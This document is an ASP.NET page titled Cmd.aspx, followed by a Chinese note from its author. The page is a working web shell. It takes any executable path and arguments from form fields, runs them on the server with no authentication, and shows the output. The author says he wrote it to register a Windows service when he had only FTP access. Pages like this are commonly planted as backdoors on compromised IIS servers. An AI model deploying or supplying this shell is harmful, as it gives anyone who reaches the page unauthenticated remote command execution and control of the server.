<%@ Page Language="C#" AutoEventWireup="true"%>
<%@ import Namespace="System.Diagnostics"%>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<script runat="server" language="C#">
    protected void Page_Load(object sender, EventArgs e)
    {
        if(!IsPostBack) curdir.Text = Server.MapPath(".");
    }
    protected string RunCmd(string path, string cmd, string curdir)
    {
        string retval = "";

        try
        {
            Process p = new Process();
            p.StartInfo.FileName = path;
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.WorkingDirectory = curdir;
            p.StartInfo.RedirectStandardError = true;
            p.StartInfo.RedirectStandardInput = true;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.CreateNoWindow = true;
            p.StartInfo.Arguments = cmd;
            p.Start();
            p.StandardInput.WriteLine("exit");
            retval = "\r\n----------- 运行结果 --------------\r\n";
            retval += p.StandardOutput.ReadToEnd();
            retval += "\r\n----------- 程序错误 --------------\r\n";
            retval += p.StandardError.ReadToEnd();
        }
        catch (Exception err)
        {
            retval = err.Message;
        }

        return retval;
    }
    protected void Execute_Click(object sender, EventArgs e)
    {
        string path = cmdpath.Text;
        string cmd = cmdline.Text;
        string wkdir = curdir.Text;

        result.Text = RunCmd(path, cmd, wkdir);
    }
    
</script>
<html xmlns="http://www.w3.org/1999/xhtml" >
<head runat="server">
    <title>剑眉大侠 and Cmd.aspx</title>
</head>
<body>
    <form id="form1" runat="server">
    <div style="text-align: left">
        <span style="color: #ff99ff">Cmd.aspx powered by 剑眉大侠<br />
            <br />
        </span>CMD Path:<asp:TextBox ID="cmdpath" runat="server" Width="755px">c:\windows\system32\cmd.exe</asp:TextBox><br />
        CurrentDir:<asp:TextBox ID="curdir" runat="server" Width="755px"></asp:TextBox><br />
        CMD Line:<asp:TextBox ID="cmdline" runat="server" Width="756px">/c set</asp:TextBox>
        <asp:Button ID="Execute" runat="server" OnClick="Execute_Click" Text="Execute" /><br />
        <br />
        <asp:TextBox ID="result" runat="server" Height="460px" TextMode="MultiLine" Width="901px"></asp:TextBox></div>
    </form>
</body>
</html>





//

ASP.NET环境下执行cmd命令的程序，相当于cmd.asp不过这个需要asp.net环境,由于IIS6的机制，本程序不能在IIS6运行，不过可以很好的支持IIS5.x ＋ .net framework.

用起来方便，而且错误比较全。

之前不是写了windows服务吗，需要向系统注册服务，但是我只有ftp权限怎么办，不能远程到桌面。 
        想了个办法，写了一个aspx页面，通过代码调用cmd来运行。当然，因为服务器安全放的比较开，内网吗～





